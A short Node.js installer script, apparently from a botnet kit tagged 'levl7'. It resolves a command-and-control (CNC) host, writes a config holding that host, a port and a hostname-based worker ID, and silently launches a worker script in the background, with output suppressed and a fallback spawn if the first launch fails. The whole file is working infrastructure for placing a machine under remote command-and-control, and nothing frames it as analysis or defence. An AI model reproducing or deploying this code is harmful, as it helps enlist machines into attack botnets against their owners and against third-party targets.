#!/usr/bin/env node
const fs = require("fs");
const path = require("path");
const os = require("os");
const { execSync } = require("child_process");

const CONFIG_PATH = path.join(__dirname, "master.json");

function log(...args) { console.log("[levl7-install]", ...args); }

function detectCncHost() {
  if (process.env.CNC_HOST) return process.env.CNC_HOST;
  try {
    const result = execSync("ip route get 1 | awk '{print $NF;exit}'", { encoding: "utf8" }).trim();
    if (result) return result;
  } catch {}
  return "127.0.0.1";
}

function writeConfig(host, port) {
  const cfg = {
    cnc_host: host,
    cnc_port: port || "8080",
    worker_id: `wkr_${os.hostname()}_${Date.now()}`,
    debug: !!process.env.DEBUG,
  };
  fs.writeFileSync(CONFIG_PATH, JSON.stringify(cfg, null, 2));
  log("Config written:", CONFIG_PATH);
  return cfg;
}

function launchWorker() {
  const workerPath = path.join(__dirname, "index.js");
  const cfg = writeConfig(detectCncHost(), process.env.CNC_PORT);

  try {
    execSync(`node "${workerPath}" &`, {
      cwd: __dirname,
      env: { ...process.env, CNC_HOST: cfg.cnc_host, CNC_PORT: cfg.cnc_port, WORKER_ID: cfg.worker_id },
      stdio: "ignore",
      timeout: 10000,
    });
    log("Worker launched in background");
  } catch (e) {
    log("Worker launch:", e.message);
    // Try direct spawn
    const cp = require("child_process");
    cp.exec(`node "${workerPath}" >/dev/null 2>&1 &`);
  }

  log("Install complete. Worker ID:", cfg.worker_id);
}

launchWorker();
